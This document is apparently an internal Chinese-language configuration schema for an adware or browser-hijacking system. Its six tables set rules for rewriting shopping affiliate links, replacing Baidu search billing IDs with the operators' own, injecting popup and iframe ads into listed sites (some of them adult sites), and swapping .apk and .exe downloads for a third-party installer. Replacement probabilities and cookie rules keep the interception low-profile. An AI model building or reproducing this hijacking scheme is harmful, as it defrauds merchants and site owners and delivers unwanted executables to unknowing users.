表1: 
	cps 返利表,
	key: int 
	ChannelIdjy : 1200004;  // 渠道号类似于我们的原来的网盟的 6501， 8000 ，9000之内的
    cpshost: "http://www.98fanli.com",   // 导购返利站的中转跳转的地址，类似于金山导购站
    searchhost: "http://www.tfss123.com", // baidu.hao123等网站要跳的中间域名
    haulBackhost:"http://www.tfdhbf123.com", //qq导航网站跳转的中间处理域名
    protecthost: "http://www.tfdhbf123.com", //duba ,sogo hao777等网站链结处理跳转的中间域名
    tmallhost: "http://www.tfdhbf123.com",  //taobao,tmall链结跳转的要跳的中间域名
	name : "banggo.com"  ---> string   //返利站网址名
	transit: "/c/"+ ChannelIdjy +"/banggo"  --------> string //跳转的链结拼结信息
	matchs:  "www.banggo.com/goods/","www.banggo.com/theme/" ----> //匹配网址
	indexof:  '#', '#testFloat1', '#testFloat2', '#testFloat3', '#testFloat4', '#testFloat5' --------> //匹配字段
	chance:  "100%" ,"30%" ---------> //替换机率
	cpsUrl： "banggo':'http://c.duomai.com/track.php?site_id=198042&aid=145&euid=&t="  //cps_url	链结

表2: search业务表 //百度搜索业务
	key: int, //唯一id
	type: "search ,project,haulBack,vip,Jd,flowcount,ad" //类型区分，分别的search,project vip,Jd等类型
	pid: 'mm_122197094_22032725_73500374',  // 记费的pid
	name: "www.baidu.com"  ---> string //当前要处理网站的域名，类似于key
	tn: "un_369374_102"  -------> //duba产品要白名单1  以下三种白名单的写法，一般用第三种
	vague： "hao9.downhelper" ----> //essw产品的白名单2(一定要处理的) 
    cpsUrlKey : "jd" ------->  //京东执卖返利要跳转的url 的 key    i = o.cpshost + "?mod=jump&act=mall&url=" + r.cpsUrl[e.cpsUrlKey] + e.jdItemHost + s; c.redirect(i)
	jdItemHost : "https://item.jd.com/" --------> // 京东热卖返利要跳转的要添加的 url
	whitelist： "/92812351_hao_pg|94667043_hao_pg"  //白名单3  
	param: "/baidu/"+ChannelIdjy,  //跳转的参数
	target: "/p", //链结拼结 hosturl + target 
	url: "http://www.tfss123.com", //跳转中继的url
	refwhitelist: "www.2345.com/?30807|www.2345.com/?30807-0001|www.hao774.com/?37818-0001", // 来源是不是白名单中链结
	browserVague: "2345Explorer" ---//浏览器限制 。。指定要在那个浏览器上进行处理
    chance:  "100%" ,"30%" ---------> //替换机率
	cookiejumpNum: 1    // 跳转的次数
	cookiename:"bdsearch", // cookie_name 保存的信息的名称
	cookieTime: 60 , //时间间隔处理 60s内中处理一次，不要多次要去拦 
	cookieclears: "www.baidu.com" , "baidu.com"  //刚处理过一个baidu.com的站，又来一个百度的其它的站，没在时间间隔不处理
	//例如 www.baidu.com？tn=计费,虽然记费的id不是我们的，但是cookie已有处理的baidu.com记录ID信息就不要在处理的了 
	status:1   // 比如关闭此功能

表3: popup 广告表 //对接网盟原来的业务
       key: int //自动排序
       src:"http://boardx.huanqiu.com/union_layer.js", //替换的js
       cid:"u2824614",  //百度的广告的id
       size:"300*250",  //广告的大小
       whitelist:  "huodong.taobao.com":{"PopupTime" : 1800},//白名单,在那些网站上弹出，弹出时间

表4 ：  tmall: //天猫，淘宝返利站
		key int //自动排序
		chance: "100%", // 处理的机率
		type:"tmall,taobao"  //有tmall,taobao两组数据
		hostUrl: "http://s.click.taobao.com/t?e=m%3D2%26s%3D9HuozCBo6v8cQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2Z76R%2BwG3uESyqeBTj9FJSggccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4EAUQdVyQjtvdXLFE7SC8Xix379%2FgWHD1l5j7LRuVuGxxiXvDf8DaRs%3D",
		precise "utf-8的标题"  //这个是跳转后的栏目的 例如天猫电器城等标题
		//whitelist是一定不要处理的，vague是一定要处理的。
		vague："%u55B5%u9C9C%u751F"|"http://s.click.taobao.com/t?e=m%3D2%26s%3DlHwrY2GhCfscQipKwQzePCperVdZeJvipRe%2F8jaAHci5VBFTL4hn2bms%2FnjObYvrhEvvQe3dPn0gccGXpMmB7Fk0LXqbMl%2BDqbgJmubom%2FJcW7kXRW8P4L0CYBEjBf0rFG7FrgRfauWx379%2FgWHD1uoPXyFbMSxd"
		// vague:"taobao.com|tmall.com",
		rf : "http://www.98fanli.com", //要请求的返利站的名称
		ajaxUrl : "https://g.click.taobao.com/display",  //发ajax请求的url,代码中没有用到.
		indexof: ['#'],  //查找的关键字
		cookie_clears:"taobao.com" , "tmall.com"  // 已处理了taobao就在cookie中添加taobao字段,
		url: "http://www.966cu.com/che/taobao",  //处理淘宝之后要跳转的url
		status:1  //此功能开关

表5  game: //游戏表
    key int // 唯一的id 
	name : "gb"  // game 分为gb sf //gb 表示网页，sf 表示flash之类的，类型的区分
	replace_type : "game,replcae ,officialReplace" // game replcae officaialReplcae 三组数据类型
	//下载信息 里面的信息格式用 | 分开 第一个是 sogou 表示渠道，100% 是机率 | 下载的url | 版本相关的信息
	download_info "sogou|100%|http://lxdl.591fq.com/ksbinstaller_96_001124.exe|(xiazai.sogou.com, '%u641C%u72D7%u4E0B%u8F7D')"  
	hostUrl: "https://www.971fl.com", //发ajax请求的域名
	//白名单
	whitelist:"^(w*?.)?((so|baidu|fang|taobao|tmall|xunlei|kugou|hc360|17173).com$|360.cn$)|.*?(gov|edu|org).(w*?)$",
	target:"/g",  //ajaxurl链结参数 https://www.971fl.com/g/ 发ajax请求 hostUrl + target === https://www.971fl.com/g 发的get请求的链结
	intervalTime:0,  //定时器时间  代码中没有用到这个参数 
	cookieName:"gameing", //cookie名字
	cookieTime:3600,   //时间间隔,代码并没有用到，只是设置了这个值
	gotoUrl:"http://706893.com" // 根据ajax 请求结果，返回的状态的 0不跳转 为1 表示要重新跳到一个新的链结合
	channel: ChannelIdjy ; //通道的id 表示我们当有config.js是那个通道的
	indexof: ['.apk', '.exe']  //下载的应用程序类型
	type: "game,total,sf,onclicktotal"  //有两种类型，有些类型是有些字段是空的,表示当前的数据类型没这个字段

表6  alert:{  //弹框广告
		key int // 唯一的id 
		//whitelist是一定不要处理的，vague是一定要处理的。黑名单吧。
		vague:"www.manhuatai.com|car.autohome.com.cn|www.panda.tv|mini.eastday.com|www.huya.com|www.shenmanhua.com|www.kanman.com|5555av.co|www.iyouman.com|sports.sina.com.cn|b.faloo.com|price.pcauto.com.cn|live.bilibili.com|www.sina.com.cn|www.huajiao.com|www.yqimh.net|www.5555av.co|www.zhanqi.tv|www.9c9v.com|www.lieqinews.com|www2.yiren666.com|www.mm131.com|www.dfvod.com|www.quanmin.tv|www.qiwen007.com|bx.chinazhonghai.com|cl.thoe.pw|haha.9ku.com|www.sis11.com|toutiao.china.com|www.beiwo.tv|1024x3.click|www.javbus2.com|99kk3.com|s2.lulujjs.biz|www.svmh8.com|cl.friu.pw|sudi58.com|x2.pix378.info|1024xx3.pw|www.gavbus6.com|cl.wedid.us",
		//弹框类型
		type:"1",  //类型  代码中没有看到用过这个字段
		//弹框iframe_url
		alertUrl: "http://www.kd028.com/qiwen/25486.html",
		//浏览器限制 指定那个浏览器可以处理，没有的话是所有浏览器
		browserVague:"BIDUBrowser|QQBrowser|UBrowser",
		//弹框div块状显示,在页面上插的div是不是块状显示
		alertDisplay:"block",
		//弹框的宽度
		width:"300px",
		//弹框的高度
		height:"250px",
		//弹框是否自动关闭, shutdonw =1 shutdownTime:5000 表示 当前弹框在5s后自动关闭
		shutdown: 0,
		//弹框关闭时间
		shutdownTime:5000,
		//弹框显示时间,代码中没有用到
		cookie_Time: Time:3600
		//当前弹框的状态 0: 表示关闭 1: 开启
		status:0  //vague功能开关  0: 表示所有页面都处理，1 ： 表示只在vague的范围内的处理